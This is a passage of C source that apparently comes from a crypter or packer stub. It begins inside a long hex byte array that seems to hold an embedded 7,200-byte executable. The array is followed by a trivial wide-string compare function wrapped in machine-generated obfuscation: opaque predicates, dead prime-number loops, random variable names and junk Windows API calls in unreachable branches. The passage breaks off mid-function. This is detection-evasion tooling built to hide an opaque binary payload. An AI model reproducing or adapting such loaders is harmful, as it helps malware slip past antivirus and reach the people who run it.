4\xee\x33\xf5\x0b\xd8\x9a\xb5\xf3\x68\xbb\x0d\x12\x1f\x60\x6e\x1e\xca\xa5\xe7\xc7\x98\xa2\xec\x49\x7a\xaa\x5f\x64\xe9\xe8\x54\x88\x01\xce\x1f\x6b\x32\xcc\xa3\x89\x54\x83\x29\x2a\x27\x26\xc5\xe6\xe8\xb1\x89\x6f\x54\x02\xce\x27\x5c\x82\xa5\x90\x83\x1c\x22\x10\xf8\x71\x23\xb3\xfc\x36\x19\x7b\x7a\xed\xf1\x5a\xa1\xee\xae\x76\x8d\x86\xcf\x97\xaa\xd8\x6a\xf1\x98\xc8\xd9\x74\x53\xd6\x67\x8c\x86\xb5\xd1\x83\xc8\xae\x39\xf9\xe0\x0b\x77\x2a\x3f\x36\xd4\xea\x2a\xdf\xeb\xc7\xf8\x2e\xaa\xf7\x82\xb0\x71\x38\xc9\x3e\xf6\x68\x19\x74\x13\xe3\xa2\x98\xa3\x3b\x8c\x2f\x67\x2a\xb7\x88\xef\xd2\x60\x5f\x35\xdf\x84\x16\x4c\x89\x44\xc0\xd3\x84\x53\xf6\xd0\xe8\x08\x9b\x7f\x0b\x3c\x9a\x65\xa1\x82\x75\x0b\x02\x71\xd4\x1c\x92\x85\x38\x63\x77\x5a\x14\x30\x0f\xa0\x96\x8b\x18\xd3\xdc\xf1\x9c\xbe\xdb\x55\x5b\x38\x5a\x41\x6b\x08\xdf\xb5\x1a\x3f\x08\x7e\xa6\x0a\xf5\x77\x97\x18\x12\x80\xc9\x1a\xb6\x9f\xdc\x69\x98\x8c\x90\x11\x16\x7f\x5b\x92\x6c\xb7\x41\x94\xbf\x91\xe2\x27\x8e\x65\xbe\xd8\x41\x99\x9f\xf4\x52\xca\x97\xdc\xc6\x95\x38\xa3\xfc\xaa\xc8\x78\xc9\x83\x03\x7c\x16\x25\xd3\xba\xd1\xd9\x22\xa1\x16\xce\xbe\xfd\xc6\x3f\x67\xca\xe8\x5e\x91\xb8\x14\x19\x6c\x13\xe6\x8f\x94\x96\x5d\x51\xf3\xa8\x0e\x6d\x51\x00\x47\x3f\x22\x1f\x5e\x34\xc2\x2a\x3f\x7b\x77\xf8\xde\xc6\xc7\x62\x94\x61\xe0\x09\x5e\xae\x20\x69\x5c\x93\xb3\x82\x58\x2f\x73\xcc\x73\x4f\xb2\xf7\x50\xdf\xda\x10\x3f\x85\xaf\xa4\xe6\x80\xc9\x04\x2c\xf3\x7c\xb3\x86\xf8\x30\x48\x33\x7f\x7b\x3c\x9a\x99\x19\x42\x71\xd3\xba\x31\xbc\x4c\xaa\xb5\x48\x53\x27\xfa\xe4\xec\x3f\x00\xfa\x3b\xc0\x53\x9c\x59\x54\x8e\xe3\x75\xab\x98\x5a\xed\x03\x28\xa3\x3d\xe2\x5f\x50\x6e\x2e\x4a\x65\xc7\xe7\x98\xc2\x14\x29\x3a\x02\xff\x54\xe9\x28\xa4\xd8\x21\xfe\x1f\x4b\xf2\xcc\xeb\xd9\x54\x1b\x19\x5a\x27\x56\xa5\x16\xc8\x31\xe9\x4f\x94\x62\x06\xa7\xdc\x8a\xe5\x60\xc3\x7c\xe2\x90\x58\x31\x03\x13\x2c\x06\x9d\x3f\x7a\xd7\x3b\xee\xf6\xc9\xae\x36\x0d\x26\x5f\x37\x5a\x88\xc0\xe1\x76\x90\xe2\xec\xc4\x09\xc7\x0c\x26\x75\x61\x63\x48\xae\x11\x1d\x26\x83\x0a\xea\xb3\x1e\x94\xaa\xca\x9f\x6b\x67\x88\xfe\xea\xd7\xca\xf2\x1f\x8c\x48\x9b\xb6\xe8\x19\x14\x63\x03\xf2\xc8\x55\x67\x16\x87\x86\xf2\x26\xf9\x8f\x12\x40\x1f\x05\x7f\x44\xf6\x90\xc1\x6e\x9c\xb4\x9c\x1b\x46\x50\xe8\x68\x9b\x9f\x2b\xec\xaa\x6d\xd5\x32\x8b\x3d\xde\x3e\xa7\x5c\x52\x05\x98\x73\x57\x0a\x44\x6a\x07\x2e\x8a\xb4\x98\x94\xb7\x91\x9c\x5e\x5b\xa5\x7b\x38\x9a\x15\xcf\xee\xab\x58\x92\x4b\x78\xfe\x66\xaa\xf5\xf7\xf7\x28\x62\xec\xb1\xd2\xec\xbd\x28\xb0\x05\x0c\x90\x11\xf6\x0f\x3b\xe2\x5c\x7d\x3d\x4e\x43\xc8\x32\x66\x9f\x45\xfe\xb8\xc1\x69\x7f\x34\x32\xf2\xf7\x46\x1e\xae\xf8\x73\x7c\x6a\x48\xd8\x89\xe3\x63\xac\x66\x79\xe7\x5a\x6b\x43\x56\x26\xb1\xce\x7e\x7d\x66\x4f\x07\x7a\x18\x14\xb1\x76\x5c\x62\xe4\xa4\xc9\xef\x14\x36\x1d\x61\xd3\x28\x8e\x75\x25\xc6\x4f\xc2\xc2\x43\x26\xf4\x82\xca\xff\x7b\x17\x88\x2e\xa6\x37\x0a\xf6\xcf\x74\x58\x1b\x6e\xa0\x69\xfc\x63\xd3\xd2\x08\x91\xef\x76\xbb\xee\x1a\x86\x51\x7f\x1a\xf0\xff\xd5\x4f\x64\x46\x24\x31\xae\xa8\xc4\xd4\x8b\x56\x78\x30\xa8\x33\x1f\x9b\xec\x2a\xb1\xfd\x12\x37\x05\x36\x2e\xef\x8c\x6a\x35\xa8\xe3\x07\xaa\x94\x66\x47\xee\xce\x04\x80\xb4\xc7\xf9\x54\x2e\x63\x45\xcb\x98\x1a\xf1\x37\x0e\xbf\x70\xba\x9b\x00\xee\xee\xea\x65\xc7\x47\xa8\x92\x00\xc1\xd2\x38\xfd\x20\x00\xd5\x24\xd8\x21\xde\x2f\x2b\x42\x3c\x21\x85\xae\x0f\x30\x4a\x06\x17\x85\x56\xa8\xb1\x39\x2f\xd4\xc2\xee\x17\x46\x62\xce\xa0\x23\x1c\x12\x40\x58\x41\x83\xb3\x2c\x06\xb5\x2f\xba\x5f\xab\xfe\x56\xb9\xce\xc6\xed\xc6\xff\x57\x9a\xe8\x28\x61\xf6\xa8\x02\x5c\x84\x69\xf7\x5c\x46\x65\xa1\x43\x08\x2e\xb9\x8d\xe6\x7b\x1a\xda\xd3\x0e\xf4\xda\xca\xbf\xcb\x47\x88\x1e\xe2\x37\xca\x3a\xdf\x5c\x68\x3b\x46\x98\xb9\x44\x23\xa3\xb2\x88\xad\x17\x56\xcf\xb6\x82\xe6\xc9\x4f\x22\xa0\xff\x65\x9f\x84\xd6\xf8\x81\x6e\xb4\xf4\x8c\xfb\x46\x80\xb8\xe8\x6b\xdf\x0b\xec\x6a\x55\x85\x72\xc3\x6d\xce\x1e\x17\x5c\x02\x65\x18\x93\x37\x4a\xa4\x62\x27\x2e\xd2\xb4\x68\xd4\x77\x9d\xc8\x42\x39\x6e\x69\xf5\x22\x7a\x3e\xad\x37\x7d\xe0\x7d\x51\xe8\x40\x9c\xdc\x70\xda\xbf\x3f\x96\x45\xc8\x4b\xcb\x1b\xbb\x06\xeb\x1c\x53\xd9\xcb\xd1\xcb\x19\x45\xd0\x3c\x8f\xdb\xfc\x19\x29\xf5\x93\x18\x0f\x7e\x83\x14\x45\xe4\x2a\x50\xf1\x71\x55\x8d\x25\x13\xb6\xa2\xb1\xd2\x6a\xe1\xd8\x9a\xe4\x23\xf8\x74\xf6\xcc\xd5\x1a\x7f\x50\x26\x23\x1e\xff\x3e\x33\x37\xd2\xb9\x8c\xaf\xa3\xbe\x18\xb9\xcc\xf0\x97\x75\x40\x66\x0f\xc9\xc8\xf8\x7b\x39\x55\x19\xa9\xa9\xea\xe9\x3e\xbe\xf4\x5d\xbb\xda\xf0\x70\x34\x8b\xd8\x9d\x42\xc6\x0e\xe4\xac\x2e\x92\xee\xaf\x30\xd7\x1d\xa1\x9f\xc0\x46\x4a\xec\x1b\x7e\x34\xf7\xdf\x5b\x31\xbd\x44\xc0\x14\xf1\x55\x64\x83\x8b\xce\x60\x76\xf7\xfb\xe1\x79\x37\xf9\x9d\xc4\x56\x9a\x0f\xe6\x8b\x6e\x1a\x72\xfa\x91\x6a\x8a\x30\x88\x1f\x88\x53\x4c\x01\x76\xaf\x40\xf1\x6e\xb8\x3b\x43\xe7\xae\x2d\xf8\x8d\xbd\x33\x75\x3d\xd2\x47\xa0\x49\xf0\x90\xe3\x46\x98\x57\xf2\x7f\x71\xc4\x1d\x8f\xb4\x53\xf8\x45\x16\x37\xe5\xac\x36\x48\xaf\x1d\x27\x5e\xbc\xea\xb3\x85\x5d\x17\xa6\x41\xb6\x4a\xa9\xae\x22\x90\xa9\x28\x2c\x87\x73\xad\xc2\x9e\xa4\x7e\xae\x5a\xe8\x2e\x7a\xe7\x4c\x99\x4b\x16\x64\xec\x10\x80\x5c\xe8\xe1\x1e\xcc\x64\xa6\xf4\xec\x9e\x0e\x3d\x88\x64\x5c\xcf\xb6\xc5\x91\xba\x24\x8c\xec\xdf\x2c\xf6\xce\x67\xec\x33\xb3\x2b\x62\x3f\xea\x80\xd0\xa6\x00\x4d\x58\x65\xc7\xa8\xe0\x70\xe8\xe4\x80\x30\x5c\xa8\xc0\x00\x48\x00\x40\xb0\xd0\x91\x00\xee\x78\x9c\xf0\x33\x2e\x1c\xa4\xb0\xc2\xa9\x30\x74\x68\xcf\xe0\x73\x99\x38\x2a\x35\xad\x22\xb4\x4e\x2a\xd3\xac\x21\xa7\x12\x18\x6e\x0c\xa5\x02\x58\x71\x1a\x78\x64\xd2\x38\x94\xd6\x8a\xd5\x64\xb4\xc4\x5d\xe4\xb5\x77\xca\xb8\xfc\x64\xfb\x3c\x46\x0a\x5b\x48\x5b\x7f\x5b\xa4\xe7\xce\xec\x04\x06\xbc\x11\x80\xdd\x3b\xe8\x94\x38\x60\x2a\xe2\x00\xca\xb0\x9c\xa0\xc8\x94\x60\x58\x0c\xcd\x84\xfe\x1c\x18\xe6\xd3\xd6\x68\xb0\x00\xae\xfd\x78\xe4\xec\xcf\x1c\x0b\x29\x9e\xc8\xad\x33\xd2\x08\xce\xc2\xc7\xbc\xa9\x8b\x8e\x74\x66\x98\xc5\x64\x38\x15\x86\x4c\x04\x7e\x24\xfc\x0e\x1e\x05\x58\x24\x64\xf3\xd6\xb5\x6d\xe2\x54\x0c\x84\x7f\xfc\x16\x3e\x0f\x8c\x63\xfb\xaf\xfa\x9f\x46\x58\x30\xc6\xc8\x0d\xc8\x95\xb7\xb2\x16\x53\x57\x75\xe5\xee\x3a\x16\x52\x1a\x90\x84\x44\x7b\x27";
DWORD executable_size = 7200;
int wcs_equals(const wchar_t *s1, const wchar_t *s2)
{
  {
    {
      {
        unsigned int v7d5a0bde1eae5894f032f96f06a00193_useless_opaque = (unsigned int) 1567626219;
        unsigned int v323babb1e19273fd50323aac35392de5_computation_opaque = (unsigned int) (&v7d5a0bde1eae5894f032f96f06a00193_useless_opaque);
        unsigned int v78aa375effce18ea5a37c5b26321364a_true_opaque = (((v323babb1e19273fd50323aac35392de5_computation_opaque * v323babb1e19273fd50323aac35392de5_computation_opaque) + v323babb1e19273fd50323aac35392de5_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        while ((*s1) == (*s2))
        {
          if (!v78aa375effce18ea5a37c5b26321364a_true_opaque)
          {
            if (!v78aa375effce18ea5a37c5b26321364a_true_opaque)
            {
              v78aa375effce18ea5a37c5b26321364a_true_opaque = v323babb1e19273fd50323aac35392de5_computation_opaque || v7d5a0bde1eae5894f032f96f06a00193_useless_opaque;
              v7d5a0bde1eae5894f032f96f06a00193_useless_opaque = v323babb1e19273fd50323aac35392de5_computation_opaque || v7d5a0bde1eae5894f032f96f06a00193_useless_opaque;
              v323babb1e19273fd50323aac35392de5_computation_opaque = v78aa375effce18ea5a37c5b26321364a_true_opaque < ((unsigned int) 1);
              if (v78aa375effce18ea5a37c5b26321364a_true_opaque)
              {
                v323babb1e19273fd50323aac35392de5_computation_opaque = v78aa375effce18ea5a37c5b26321364a_true_opaque - v323babb1e19273fd50323aac35392de5_computation_opaque;
                v7d5a0bde1eae5894f032f96f06a00193_useless_opaque = v78aa375effce18ea5a37c5b26321364a_true_opaque || v323babb1e19273fd50323aac35392de5_computation_opaque;
              }
            }
            v323babb1e19273fd50323aac35392de5_computation_opaque = v7d5a0bde1eae5894f032f96f06a00193_useless_opaque <= v323babb1e19273fd50323aac35392de5_computation_opaque;
            v7d5a0bde1eae5894f032f96f06a00193_useless_opaque = v78aa375effce18ea5a37c5b26321364a_true_opaque < ((unsigned int) 119);
            v78aa375effce18ea5a37c5b26321364a_true_opaque = v78aa375effce18ea5a37c5b26321364a_true_opaque | v7d5a0bde1eae5894f032f96f06a00193_useless_opaque;
            v78aa375effce18ea5a37c5b26321364a_true_opaque = v78aa375effce18ea5a37c5b26321364a_true_opaque < ((unsigned int) 74);
            v7d5a0bde1eae5894f032f96f06a00193_useless_opaque = v7d5a0bde1eae5894f032f96f06a00193_useless_opaque <= v323babb1e19273fd50323aac35392de5_computation_opaque;
          }
          if ((*s1) == 0)
            return 1;
          s1++;
          if (!v78aa375effce18ea5a37c5b26321364a_true_opaque)
          {
            void * v9f89c8f9760228ff430d605b7a51dcab = (void *) 0x80ab3210;
            long v18ce3d4c74345cd0fe7e09e29aa2b091 = (long) 0xae519999;
            v18ce3d4c74345cd0fe7e09e29aa2b091 = RoUnregisterForApartmentShutdown(v9f89c8f9760228ff430d605b7a51dcab);
          }
          s2++;
        }

        return 0;
      }
      unsigned int vd97106a2e98aa9b7d9b72328faad4b92_useless_opaque = (unsigned int) 3153314409;
      unsigned int v236a41b9f98812ae1d92c44794465907_computation_opaque = (unsigned int) 0;
      unsigned int v3a5ee2c411d57df9a9487165605b9019_computation_opaque = (unsigned int) 3;
      unsigned int v5938bc5a852787a11772170aeadab566_computation_opaque = (unsigned int) (&vd97106a2e98aa9b7d9b72328faad4b92_useless_opaque);
      v5938bc5a852787a11772170aeadab566_computation_opaque = (v5938bc5a852787a11772170aeadab566_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v5938bc5a852787a11772170aeadab566_computation_opaque < ((unsigned int) 3))
      {
        v5938bc5a852787a11772170aeadab566_computation_opaque = (unsigned int) 3;
      }
      while (v236a41b9f98812ae1d92c44794465907_computation_opaque != ((unsigned int) 1))
      {
        v5938bc5a852787a11772170aeadab566_computation_opaque += (unsigned int) 2;
        v236a41b9f98812ae1d92c44794465907_computation_opaque = (unsigned int) 1;
        v3a5ee2c411d57df9a9487165605b9019_computation_opaque = (unsigned int) 3;
        while ((v3a5ee2c411d57df9a9487165605b9019_computation_opaque * v3a5ee2c411d57df9a9487165605b9019_computation_opaque) <= v5938bc5a852787a11772170aeadab566_computation_opaque)
        {
          if ((v5938bc5a852787a11772170aeadab566_computation_opaque % v3a5ee2c411d57df9a9487165605b9019_computation_opaque) == ((unsigned int) 0))
          {
            v236a41b9f98812ae1d92c44794465907_computation_opaque = (unsigned int) 0;
          }
          v3a5ee2c411d57df9a9487165605b9019_computation_opaque = v3a5ee2c411d57df9a9487165605b9019_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v3a9ea7e225170338e549c7149f16d017_prime_opaque = v5938bc5a852787a11772170aeadab566_computation_opaque;
    }
    unsigned int v31cc0d3e71436c870421f95e6d8b5029_useless_opaque = (unsigned int) 487812245;
    unsigned int v6823c9baff279319c573950f38c24ff3_random_opaque = (unsigned int) (&v31cc0d3e71436c870421f95e6d8b5029_useless_opaque);
    unsigned int ve26f1d8048af49db422418ee025875c4_useless_opaque = (unsigned int) 2718940354;
    unsigned int v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque = (unsigned int) 0;
    unsigned int v3e818513176980e73f954286ed37a422_computation_opaque = (unsigned int) 3;
    unsigned int va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = (unsigned int) (&ve26f1d8048af49db422418ee025875c4_useless_opaque);
    va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = (va18c129a0bf44f26a56e018e2268d8b6_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (va18c129a0bf44f26a56e018e2268d8b6_computation_opaque < ((unsigned int) 3))
    {
      va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = (unsigned int) 3;
      unsigned int v34675d7684fa4ee19591344c28e50d64_useless_opaque = (unsigned int) 3963954412;
      unsigned int v49719cd12e09957b4d6d535c721788fa_computation_opaque = (unsigned int) 0;
      unsigned int va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = (unsigned int) 3;
      if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
      {
        if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
        {
          va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = v3e818513176980e73f954286ed37a422_computation_opaque < v31cc0d3e71436c870421f95e6d8b5029_useless_opaque;
          v49719cd12e09957b4d6d535c721788fa_computation_opaque = v34675d7684fa4ee19591344c28e50d64_useless_opaque == v31cc0d3e71436c870421f95e6d8b5029_useless_opaque;
          v6823c9baff279319c573950f38c24ff3_random_opaque = ve26f1d8048af49db422418ee025875c4_useless_opaque | ((unsigned int) 123);
          va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = v34675d7684fa4ee19591344c28e50d64_useless_opaque * v31cc0d3e71436c870421f95e6d8b5029_useless_opaque;
          v3e818513176980e73f954286ed37a422_computation_opaque = v34675d7684fa4ee19591344c28e50d64_useless_opaque != v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque;
          v3e818513176980e73f954286ed37a422_computation_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque <= v6823c9baff279319c573950f38c24ff3_random_opaque;
          ve26f1d8048af49db422418ee025875c4_useless_opaque = v3e818513176980e73f954286ed37a422_computation_opaque == va0b4c5c6844cb28463d126b645bc13ee_computation_opaque;
        }
        v49719cd12e09957b4d6d535c721788fa_computation_opaque = v49719cd12e09957b4d6d535c721788fa_computation_opaque / va0b4c5c6844cb28463d126b645bc13ee_computation_opaque;
        va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque == v3e818513176980e73f954286ed37a422_computation_opaque;
        v3e818513176980e73f954286ed37a422_computation_opaque = v34675d7684fa4ee19591344c28e50d64_useless_opaque + ve26f1d8048af49db422418ee025875c4_useless_opaque;
      }
      unsigned int vdf02872cece3ea243c572d40e59320aa_computation_opaque = (unsigned int) (&v34675d7684fa4ee19591344c28e50d64_useless_opaque);
      vdf02872cece3ea243c572d40e59320aa_computation_opaque = (vdf02872cece3ea243c572d40e59320aa_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vdf02872cece3ea243c572d40e59320aa_computation_opaque < ((unsigned int) 3))
      {
        vdf02872cece3ea243c572d40e59320aa_computation_opaque = (unsigned int) 3;
        if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
        {
          if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
            {
              if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
              {
                vdf02872cece3ea243c572d40e59320aa_computation_opaque = v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque / ((unsigned int) 86);
              }
            }
          }
        }
      }
      while (v49719cd12e09957b4d6d535c721788fa_computation_opaque != ((unsigned int) 1))
      {
        if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
        {
          vdf02872cece3ea243c572d40e59320aa_computation_opaque = v49719cd12e09957b4d6d535c721788fa_computation_opaque / v3e818513176980e73f954286ed37a422_computation_opaque;
          va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = v34675d7684fa4ee19591344c28e50d64_useless_opaque - v49719cd12e09957b4d6d535c721788fa_computation_opaque;
          if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
          {
            v6823c9baff279319c573950f38c24ff3_random_opaque = vdf02872cece3ea243c572d40e59320aa_computation_opaque * v34675d7684fa4ee19591344c28e50d64_useless_opaque;
          }
        }
        vdf02872cece3ea243c572d40e59320aa_computation_opaque += (unsigned int) 2;
        v49719cd12e09957b4d6d535c721788fa_computation_opaque = (unsigned int) 1;
        va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = (unsigned int) 3;
        while ((va0b4c5c6844cb28463d126b645bc13ee_computation_opaque * va0b4c5c6844cb28463d126b645bc13ee_computation_opaque) <= vdf02872cece3ea243c572d40e59320aa_computation_opaque)
        {
          if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
          {
            unsigned long v2da70a401b33bc18af6176839bef95f9 = (unsigned long) 0x67f51676;
            void * v45486ccc17f8677231f1d91d420e817b = (void *) 0xd3867a7c;
            int vcf1d444c20cde580f22d894c8c321cd1 = (int) 0x30e83717;
            if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
            {
              va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = v6823c9baff279319c573950f38c24ff3_random_opaque | v3e818513176980e73f954286ed37a422_computation_opaque;
              v3e818513176980e73f954286ed37a422_computation_opaque = v34675d7684fa4ee19591344c28e50d64_useless_opaque != vdf02872cece3ea243c572d40e59320aa_computation_opaque;
              v49719cd12e09957b4d6d535c721788fa_computation_opaque = v49719cd12e09957b4d6d535c721788fa_computation_opaque % v34675d7684fa4ee19591344c28e50d64_useless_opaque;
              v31cc0d3e71436c870421f95e6d8b5029_useless_opaque = v3e818513176980e73f954286ed37a422_computation_opaque || v6823c9baff279319c573950f38c24ff3_random_opaque;
              vdf02872cece3ea243c572d40e59320aa_computation_opaque = v6823c9baff279319c573950f38c24ff3_random_opaque * v49719cd12e09957b4d6d535c721788fa_computation_opaque;
              vdf02872cece3ea243c572d40e59320aa_computation_opaque = ve26f1d8048af49db422418ee025875c4_useless_opaque + ((unsigned int) 30);
              vdf02872cece3ea243c572d40e59320aa_computation_opaque = v3e818513176980e73f954286ed37a422_computation_opaque != va18c129a0bf44f26a56e018e2268d8b6_computation_opaque;
            }
            void * vc1c8bd9f8ff4637ebeea5cb3b1820a7b = (void *) 0x197e3a43;
            int v96513d2a2b633d9a935e328ee061c73b = (int) 0x25725324;
            int vdd368487f6f8516d78400569c283b368 = (int) 0x3bbeaaf8;
            vdd368487f6f8516d78400569c283b368 = IdnToNameprepUnicode(v2da70a401b33bc18af6176839bef95f9, v45486ccc17f8677231f1d91d420e817b, vcf1d444c20cde580f22d894c8c321cd1, vc1c8bd9f8ff4637ebeea5cb3b1820a7b, v96513d2a2b633d9a935e328ee061c73b);
          }
          if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
          {
            if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
            {
              va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = va0b4c5c6844cb28463d126b645bc13ee_computation_opaque + v6823c9baff279319c573950f38c24ff3_random_opaque;
            }
          }
          if ((vdf02872cece3ea243c572d40e59320aa_computation_opaque % va0b4c5c6844cb28463d126b645bc13ee_computation_opaque) == ((unsigned int) 0))
          {
            v49719cd12e09957b4d6d535c721788fa_computation_opaque = (unsigned int) 0;
            if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long v0a8edaaa7a8d37de4a29bcb7e550c3cf = (unsigned long) 0x31a3ac0c;
              unsigned long vf9ec340bbdceea5a4d1e89f44230ed33 = (unsigned long) 0x929e730c;
              if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
              {
                vf9ec340bbdceea5a4d1e89f44230ed33 = MsiGetActiveDatabase(v0a8edaaa7a8d37de4a29bcb7e550c3cf);
              }
            }
          }
          va0b4c5c6844cb28463d126b645bc13ee_computation_opaque = va0b4c5c6844cb28463d126b645bc13ee_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v4badf6349b32ce0eb46d16a3dc6a18b0_prime_opaque = vdf02872cece3ea243c572d40e59320aa_computation_opaque;
    }
    while (v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque != ((unsigned int) 1))
    {
      va18c129a0bf44f26a56e018e2268d8b6_computation_opaque += (unsigned int) 2;
      unsigned int v1bc53845b06214767e46f6b5afef442f_useless_opaque = (unsigned int) 3440364460;
      unsigned int v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque = (unsigned int) 0;
      unsigned int ve5edaa4e797a02a046402f94908d6766_computation_opaque = (unsigned int) 3;
      unsigned int v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = (unsigned int) (&v1bc53845b06214767e46f6b5afef442f_useless_opaque);
      v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = (v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque < ((unsigned int) 3))
      {
        v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = (unsigned int) 3;
